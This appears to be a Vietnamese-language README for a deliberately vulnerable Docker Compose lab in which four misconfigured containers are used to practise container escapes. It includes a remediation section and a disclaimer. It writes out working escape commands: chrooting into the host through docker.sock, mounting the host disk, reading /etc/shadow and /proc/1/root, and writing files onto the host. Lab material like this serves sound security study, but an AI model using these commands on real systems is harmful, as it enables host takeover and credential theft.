# Docker Escape Lab

Môi trường Docker Compose gồm bốn container cấu hình hở có chủ đích, phục vụ nghiên cứu cơ chế cô lập của Linux kernel và thực hành các kỹ thuật thoát container trên máy cá nhân.

<p align="center">
  <img src="https://img.shields.io/badge/Docker-20.10%2B-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
  <img src="https://img.shields.io/badge/Linux-Kernel_5.x%2B-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux" />
  <img src="https://img.shields.io/badge/Security-Container_Escape-E95420?style=for-the-badge" alt="Security" />
  <img src="https://img.shields.io/badge/License-MIT-success?style=for-the-badge" alt="License MIT" />
</p>

<p align="center"><a href="README.md">English</a> · <strong>Tiếng Việt</strong></p>

> Toàn bộ cấu hình trong repository này cố ý thiết lập thiếu chặt chẽ nhằm phục vụ học tập và kiểm chứng bảo mật trên môi trường cô lập. Không áp dụng những kỹ thuật này lên hệ thống không thuộc quyền sở hữu hoặc chưa được cấp phép.

## Tổng quan

Mỗi service trong `docker-compose.yml` tái hiện một lỗi cấu hình thường gặp trong thực tế vận hành, kèm file flag đánh dấu từ `/flag1.txt` đến `/flag4.txt`:

| # | Service | Lỗi cấu hình | Cơ chế thoát ra host |
|---|---|---|---|
| 1 | `lab-sock-escape` | `-v /var/run/docker.sock:...` | Khởi tạo container mới mount `/` của host rồi `chroot` |
| 2 | `lab-privileged-escape` | `privileged: true` | Mount trực tiếp phân vùng ổ đĩa của host (`/dev/sda`) |
| 3 | `lab-pid-escape` | `pid: host` + `SYS_PTRACE` | Truy cập rootfs của host thông qua `/proc/1/root` |
| 4 | `lab-volume-escape` | `-v /:/host:rw` | Ghi đè lịch cron hoặc chèn SSH key trên host |

## Tự chạy tái lập

Yêu cầu: đã cài đặt Docker và Docker Compose v2 trở lên trên Linux hoặc Windows WSL2.

```bash
git clone https://github.com/Khanh1916/docker-escape-lab.git
cd docker-escape-lab
docker compose up -d
```

Kiểm tra trạng thái các container sau khi khởi động:

```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
```

Chạy script kiểm tra nhanh để xác nhận cả bốn cấu hình hở đều đang hoạt động:

```bash
sh scripts/verify_all.sh
```

## Các bước kiểm chứng

### 1. Docker daemon socket

```bash
docker exec -it lab-sock-escape bash

# Dùng Docker CLI
docker run --rm -it -v /:/host alpine chroot /host

# Hoặc gọi trực tiếp qua curl nếu container không cài CLI
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

### 2. Container chạy chế độ privileged

```bash
docker exec -it lab-privileged-escape bash
lsblk
mkdir -p /mnt/host_disk
mount /dev/sda /mnt/host_disk
head -n 5 /mnt/host_disk/etc/shadow
```

### 3. Dùng chung PID namespace với host

```bash
docker exec -it lab-pid-escape bash
ps aux | head -n 10
ls -la /proc/1/root/
head -n 5 /proc/1/root/etc/passwd
```

### 4. Mount thư mục nhạy cảm của host

```bash
docker exec -it lab-volume-escape sh
ls -la /host
echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
```

## Biện pháp khắc phục

Không mount `/var/run/docker.sock` vào container ứng dụng hay CI runner. Với nhu cầu build image có thể chuyển sang Kaniko hoặc Buildah, còn nếu chỉ đọc thông tin container thì đặt `tecnativa/docker-socket-proxy` phía trước để giới hạn ở các endpoint `GET` chỉ đọc. Chặn cờ `privileged: true`, gỡ toàn bộ capability mặc định bằng `--cap-drop=ALL`, và gắn `:ro` cho mọi volume không cần ghi. Ngoài ra nên kích hoạt `userns-remap` trong `/etc/docker/daemon.json` (hoặc dùng Rootless Docker / Podman) kết hợp `--read-only --tmpfs /tmp`.

## Dọn dẹp

```bash
docker compose down
```

## Bài viết chi tiết & Giấy phép

Phân tích cơ chế kỹ thuật đầy đủ xem tại: [khanh1916.github.io/notes](https://khanh1916.github.io/notes)

Dự án phát hành theo [Giấy phép MIT](LICENSE).
